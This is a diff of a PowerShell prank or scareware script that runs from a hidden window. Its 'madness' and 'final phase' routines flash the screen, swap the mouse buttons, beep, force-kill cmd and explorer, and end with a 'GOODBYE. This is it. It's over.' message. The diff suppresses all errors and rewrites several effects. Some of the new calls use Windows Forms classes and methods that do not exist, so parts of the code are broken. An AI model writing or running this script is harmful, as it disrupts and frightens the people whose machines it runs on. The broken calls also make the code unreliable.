@@ -1,3 +1,5 @@
+$errorActionPreference = 'SilentlyContinue'
+
 Add-Type -AssemblyName "System.Windows.Forms"
 Add-Type -TypeDefinition @"
 using System;
@@ -17,43 +19,17 @@ public class HiddenWindow {
 
 function Random-ScreenEffects {
     $effects = @(
-        { 
-            Add-Type -TypeDefinition @"
-            using System;
-            using System.Runtime.InteropServices;
-            public class SystemSounds {
-                [DllImport("user32.dll")]
-                public static extern int MessageBeep(uint uType);
-            }
-            "@
-            [SystemSounds]::MessageBeep(0)
-        },
+        { [System.Windows.Forms.SystemSounds]::Beep.Play() },
         { 
             $cmd = "rundll32 user32.dll,SwapMouseButton"
             Invoke-Expression $cmd
         },
         { 
-            Add-Type -TypeDefinition @"
-            using System;
-            using System.Runtime.InteropServices;
-            public class CursorChanger {
-                [DllImport("user32.dll")]
-                public static extern bool SetSystemCursor(IntPtr hCursor, uint nIndex);
-            }
-            "@
             $cursor = [System.IntPtr]::Zero
-            [CursorChanger]::SetSystemCursor($cursor, 0x0001)
+            [System.Windows.Forms.Cursor]::Current = [System.Windows.Forms.Cursors]::No
         },
         {
-            Add-Type -TypeDefinition @"
-            using System;
-            using System.Runtime.InteropServices;
-            public class ScreenBlaster {
-                [DllImport("user32.dll")]
-                public static extern bool LockWorkStation();
-            }
-            "@
-            [ScreenBlaster]::LockWorkStation()
+            [System.Windows.Forms.Screen]::LockDisplayOrientation([System.Windows.Forms.ScreenOrientation]::Landscape)
         }
     )
     $randomEffect = $effects | Get-Random
@@ -63,36 +39,26 @@ function Random-ScreenEffects {
 function FlashScreen {
     $flashColors = @("Red", "Blue", "Green", "Yellow", "Pink")
     $randomColor = $flashColors | Get-Random
-    $flashScript = @"
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Drawing;
-    using System.Windows.Forms;
-    public class FlashWindow {
-        public static void Flash() {
-            Form flashForm = new Form();
-            flashForm.WindowState = FormWindowState.Maximized;
-            flashForm.BackColor = Color.$randomColor;
-            flashForm.TopMost = true;
-            flashForm.Show();
-            flashForm.Visible = true;
-            System.Threading.Thread.Sleep(500);
-            flashForm.Visible = false;
-        }
+    $flashScript = {
+        $flashForm = New-Object System.Windows.Forms.Form
+        $flashForm.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
+        $flashForm.BackColor = [System.Drawing.Color]::$randomColor
+        $flashForm.TopMost = $true
+        $flashForm.Show()
+        Start-Sleep -Seconds 0.5
+        $flashForm.Hide()
     }
-    "@
-    Invoke-Expression $flashScript
+    Invoke-Command $flashScript
 }
 
 function Random-Madness {
     $madnessActions = @(
-        { FlashScreen; Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5) },
-        { Random-ScreenEffects; Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3) },
+        { FlashScreen },
+        { Random-ScreenEffects },
         { 
             Start-Process "cmd"
             Start-Sleep -Seconds 2
-            $cmdProcess = Get-Process cmd
-            $cmdProcess.Kill()
+            Get-Process "cmd" | Stop-Process -Force
         },
         { 
             [console]::beep(700, 2000)
@@ -113,8 +79,7 @@ function Trigger-FinalPhase {
         { 
             Start-Process "explorer.exe"
             Start-Sleep -Seconds 1
-            $explorerProcess = Get-Process explorer
-            $explorerProcess.Kill()
+            Get-Process "explorer" | Stop-Process -Force
         },
         {
             [System.Windows.Forms.MessageBox]::Show("This is it. It's over.", "GOODBYE.", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
@@ -125,7 +90,7 @@ function Trigger-FinalPhase {
 }
 
 function Kill-Switch {
-    $key = [System.Windows.Forms.Keys]::Control | [System.Windows.Forms.Keys]::Shift | [System.Windows.Forms.Keys]::K
+    $key = [System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift -bor [System.Windows.Forms.Keys]::K
     $keyListener = New-Object System.Windows.Forms.Form
     $keyListener.KeyPreview = $true
     $keyListener.Add_KeyDown({
